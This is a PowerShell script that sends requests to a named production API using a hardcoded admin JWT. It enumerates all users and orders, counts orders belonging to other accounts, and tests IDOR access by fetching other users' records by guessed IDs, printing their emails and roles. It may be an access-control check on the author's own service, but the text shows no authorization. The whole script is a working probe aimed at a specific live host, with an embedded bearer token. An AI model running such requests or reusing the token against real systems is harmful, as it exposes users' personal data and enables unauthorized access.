$JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2YTQ1NDNmY2NjOTA0ODQ3N2VhMTdmYTEiLCJlbWFpbCI6ImFkbWluQGJva29tYS5jaSIsInJvbGUiOiJhZG1pbiIsImZpcnN0TmFtZSI6Ik1vcm5pbmciLCJsYXN0TmFtZSI6IlN0YXIiLCJpYXQiOjE3ODM1NTQxODksImV4cCI6MTc4MzU1Nzc4OSwiYXVkIjoiYm9rb21hLXVzZXJzIiwiaXNzIjoiYm9rb21hLWFwaSIsImp0aSI6IjZkOTEzYmY3LTkzMDQtNDQ2ZC04ZGE2LTcyNmExYjgyYmY5OSJ9.S8zrKScRr9z982UUJvHoIQxQwatdHEHxcDEFeXP0djI"
$hdr = @{
  "Authorization" = "Bearer $JWT"
  "Content-Type"  = "application/json"
}
$adminUserId = "6a4543fccc9048477ea17fa1"

Write-Host "=== /users (admin) ==="
$r = Invoke-WebRequest -Uri "https://bokoma-production.up.railway.app/api/v1/users" -Method Get -Headers $hdr -UseBasicParsing
$j = $r.Content | ConvertFrom-Json
$users = @($j.data.users)
Write-Host "Status=$($r.StatusCode) | count=$($users.Count)"
Write-Host ""

Write-Host "=== /orders (admin) ==="
$r = Invoke-WebRequest -Uri "https://bokoma-production.up.railway.app/api/v1/orders" -Method Get -Headers $hdr -UseBasicParsing
$j = $r.Content | ConvertFrom-Json
$orders = @($j.data)
Write-Host "Status=$($r.StatusCode) | count=$($orders.Count)"
$ownCnt = ($orders | Where-Object { ($_.user -eq $adminUserId) -or ($_.user._id -eq $adminUserId) -or ($_.userId -eq $adminUserId) }).Count
$otherCnt = $orders.Count - $ownCnt
Write-Host "  own=$ownCnt | other_users=$otherCnt"
Write-Host ""

Write-Host "=== /orders?userId=<other> (filtrage) ==="
foreach ($id in @("6a4e609c94afa31695d52222", "000000000000000000000001", "6a4e5001bc395a2f3ec3e07c")) {
  $r = Invoke-WebRequest -Uri "https://bokoma-production.up.railway.app/api/v1/orders?userId=$id" -Method Get -Headers $hdr -UseBasicParsing
  $j = $r.Content | ConvertFrom-Json
  $cnt = @($j.data).Count
  Write-Host "  ?userId=$id -> $($r.StatusCode) count=$cnt"
}
Write-Host ""

Write-Host "=== /auth/me (admin) ==="
$r = Invoke-WebRequest -Uri "https://bokoma-production.up.railway.app/api/v1/auth/me" -Method Get -Headers $hdr -UseBasicParsing
$j = $r.Content | ConvertFrom-Json
Write-Host "Status=$($r.StatusCode) | email=$($j.data.user.email) | role=$($j.data.user.role)"
Write-Host ""

Write-Host "=== /users/<other-id> (IDOR direct) ==="
foreach ($id in @("6a4e609c94afa31695d52222", "000000000000000000000001", "6a4e5001bc395a2f3ec3e07c")) {
  try {
    $r = Invoke-WebRequest -Uri "https://bokoma-production.up.railway.app/api/v1/users/$id" -Method Get -Headers $hdr -UseBasicParsing -ErrorAction Stop
    $j = $r.Content | ConvertFrom-Json -ErrorAction SilentlyContinue
    if ($j -and $j.data -and $j.data.user) {
      Write-Host "  /users/$id -> $($r.StatusCode) | email=$($j.data.user.email) | role=$($j.data.user.role)"
    } else {
      Write-Host "  /users/$id -> $($r.StatusCode) | $($r.Content.Substring(0,80))"
    }
  } catch {
    $code = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { 0 }
    Write-Host "  /users/$id -> $code"
  }
}